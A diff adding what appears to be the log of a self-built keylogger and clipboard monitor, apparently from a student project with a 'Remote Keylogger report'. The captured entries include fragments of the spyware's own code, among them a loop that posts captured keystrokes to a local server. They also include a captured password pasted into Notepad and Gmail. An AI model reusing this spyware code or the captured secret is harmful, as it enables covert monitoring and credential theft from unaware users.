@@ -1,0 +1,122 @@
+e236829f840cb1e1bb04a7305d33a95ff342cbe4954166ff23ab2037d2b52216
+COPIED_IN 2024-11-04-03h - keylogSender4.py - Project - Visual Studio Code
+e236829f840cb1e1bb04a7305d33a95ff342cbe4954166ff23ab2037d2b52216
+e236829f840cb1e1bb04a7305d33a95ff342cbe4954166ff23ab2037d2b52216
+COPIED_IN 2024-11-04-03h - clipBoardDigestor.py - Project - Visual Studio Code
+        pathCon += pathArray[i]
+        if not (os.path.exists(pathCon) and os.path.isdir(pathCon)):
+            os.mkdir(pathCon)
+
+# def isEmptyFile(filePath):
+#     with open(filePath, 'r') as file:
+#         for line in file:
+#             if (re.search(r'\S', line)):
+#                 return False
+#     return True
+        
+def fileMaker(filename, content):
+    srcDir = sys.argv[1] + "\\"
+    files = os.listdir(srcDir)
+    root = ["ClipLog\\"]
+    safeDirContructor(root)
+
+e236829f840cb1e1bb04a7305d33a95ff342cbe4954166ff23ab2037d2b52216
+COPIED_IN 2024-11-04-03h - keylogSender4.py - Project - Visual Studio Code
+ keySender():
+    while True:
+        global dataVal
+        if len(dataVal) != 0:
+            dataCopy = dataVal.copy()
+            dataVal = dataVal[len(dataCopy):]
+            postReq = requests.post("http://127.0.0.1:5000/write", json={"data": dataCopy})        
+        time.sleep(5)
+
+def pasteClipSender():
+    curWindow = f"PASTED_IN {timeStamp()} - {GetWindowText(GetForegroundWindow())}\n"
+    pasteValue = pyperclip.paste()
+    if not (re.search(r'\S', pasteValue)):
+        return
+    global specialIdentifier
+    data = specialIdentifier + curWindow + pa
+e236829f840cb1e1bb04a7305d33a95ff342cbe4954166ff23ab2037d2b52216
+PASTED_IN 2024-11-04-03h - *super secret password - Notepad
+ keySender():
+    while True:
+        global dataVal
+        if len(dataVal) != 0:
+            dataCopy = dataVal.copy()
+            dataVal = dataVal[len(dataCopy):]
+            postReq = requests.post("http://127.0.0.1:5000/write", json={"data": dataCopy})        
+        time.sleep(5)
+
+def pasteClipSender():
+    curWindow = f"PASTED_IN {timeStamp()} - {GetWindowText(GetForegroundWindow())}\n"
+    pasteValue = pyperclip.paste()
+    if not (re.search(r'\S', pasteValue)):
+        return
+    global specialIdentifier
+    data = specialIdentifier + curWindow + pa
+e236829f840cb1e1bb04a7305d33a95ff342cbe4954166ff23ab2037d2b52216
+COPIED_IN 2024-11-04-03h - *super secret password - Notepad
+HEYEheh#36789829023
+e236829f840cb1e1bb04a7305d33a95ff342cbe4954166ff23ab2037d2b52216
+PASTED_IN 2024-11-04-03h - *super secret password - Notepad
+HEYEheh#36789829023
+e236829f840cb1e1bb04a7305d33a95ff342cbe4954166ff23ab2037d2b52216
+PASTED_IN 2024-11-04-03h - *super secret password - Notepad
+HEYEheh#36789829023
+e236829f840cb1e1bb04a7305d33a95ff342cbe4954166ff23ab2037d2b52216
+PASTED_IN 2024-11-04-03h - Gmail - Brave
+HEYEheh#36789829023
+e236829f840cb1e1bb04a7305d33a95ff342cbe4954166ff23ab2037d2b52216
+COPIED_IN 2024-11-04-03h - clipBoardDigestor.py - Project - Visual Studio Code
+fileMaker
+e236829f840cb1e1bb04a7305d33a95ff342cbe4954166ff23ab2037d2b52216
+COPIED_IN 2024-11-04-21h - server.py - Project - Visual Studio Code
+python -m flask --app .\server.py run
+e236829f840cb1e1bb04a7305d33a95ff342cbe4954166ff23ab2037d2b52216
+COPIED_IN 2024-11-04-21h - e236829f840cb1e1bb04a7305d33a95ff342cbe4954166ff23ab2037d2b52216
+PASTED_IN 2024-11-04-21h - e236829f840cb1e1bb04a7305d33a95ff342cbe4954166ff23ab2037d2b52216
+PASTED_IN 2024-11-04-21h - e236829f840cb1e1bb04a7305d33a95ff342cbe4954166ff23ab2037d2b52216
+COPIED_IN 2024-11-04-21h - interpreter3.py - Project - Visual Studio Code
+len(line.split()[1]) > 3)
+e236829f840cb1e1bb04a7305d33a95ff342cbe4954166ff23ab2037d2b52216
+COPIED_IN 2024-11-04-21h - interpreter3.py - Project - Visual Studio Code
+len(line.split()[1]) > 3
+e236829f840cb1e1bb04a7305d33a95ff342cbe4954166ff23ab2037d2b52216
+PASTED_IN 2024-11-04-21h - e236829f840cb1e1bb04a7305d33a95ff342cbe4954166ff23ab2037d2b52216
+COPIED_IN 2024-11-04-21h - e236829f840cb1e1bb04a7305d33a95ff342cbe4954166ff23ab2037d2b52216
+PASTED_IN 2024-11-04-21h - e236829f840cb1e1bb04a7305d33a95ff342cbe4954166ff23ab2037d2b52216
+COPIED_IN 2024-11-04-21h - e236829f840cb1e1bb04a7305d33a95ff342cbe4954166ff23ab2037d2b52216
+PASTED_IN 2024-11-04-21h - e236829f840cb1e1bb04a7305d33a95ff342cbe4954166ff23ab2037d2b52216
+COPIED_IN 2024-11-04-21h - e236829f840cb1e1bb04a7305d33a95ff342cbe4954166ff23ab2037d2b52216
+COPIED_IN 2024-11-04-21h - Remote Keylogger report - Word
+
+e236829f840cb1e1bb04a7305d33a95ff342cbe4954166ff23ab2037d2b52216
+COPIED_IN 2024-11-04-21h - Remote Keylogger report - Word
+ I intend to keep this data separate so that it is not affected by the keystrokes during the 
+e236829f840cb1e1bb04a7305d33a95ff342cbe4954166ff23ab2037d2b52216
+PASTED_IN 2024-11-04-21h - Remote Keylogger report - Word
+ I intend to keep this data separate so that it is not affected by the keystrokes during the 
+e236829f840cb1e1bb04a7305d33a95ff342cbe4954166ff23ab2037d2b52216
+COPIED_IN 2024-11-04-22h - e236829f840cb1e1bb04a7305d33a95ff342cbe4954166ff23ab2037d2b52216
+COPIED_IN 2024-11-04-22h - e236829f840cb1e1bb04a7305d33a95ff342cbe4954166ff23ab2037d2b52216
+COPIED_IN 2024-11-04-22h - e236829f840cb1e1bb04a7305d33a95ff342cbe4954166ff23ab2037d2b52216
+COPIED_IN 2024-11-04-22h - Remote Keylogger report - Word
+I initially wanted to make these changes directly to the log file but then decided better to write the “cleaned/filtered” version onto a new temperory file. This file could later be deleted if wanted and by doing this, it allows for easier debugging to see what was removed in the process.
+e236829f840cb1e1bb04a7305d33a95ff342cbe4954166ff23ab2037d2b52216
+PASTED_IN 2024-11-04-22h - Remote Keylogger report - Word
+I initially wanted to make these changes directly to the log file but then decided better to write the “cleaned/filtered” version onto a new temperory file. This file could later be deleted if wanted and by doing this, it allows for easier debugging to see what was removed in the process.
+e236829f840cb1e1bb04a7305d33a95ff342cbe4954166ff23ab2037d2b52216
+COPIED_IN 2024-11-04-22h - Remote Keylogger report - Word
+The way I wanted to do it was so that when put 
+e236829f840cb1e1bb04a7305d33a95ff342cbe4954166ff23ab2037d2b52216
+PASTED_IN 2024-11-04-22h - Remote Keylogger report - Word
+The way I wanted to do it was so that when put 
+e236829f840cb1e1bb04a7305d33a95ff342cbe4954166ff23ab2037d2b52216
+COPIED_IN 2024-11-04-22h - e236829f840cb1e1bb04a7305d33a95ff342cbe4954166ff23ab2037d2b52216
+COPIED_IN 2024-11-04-23h - fileAllocator1.py - Project - Visual Studio Code
+fileAllocator1
+e236829f840cb1e1bb04a7305d33a95ff342cbe4954166ff23ab2037d2b52216
+PASTED_IN 2024-11-04-23h - Remote Keylogger report - Word
+fileAllocator1
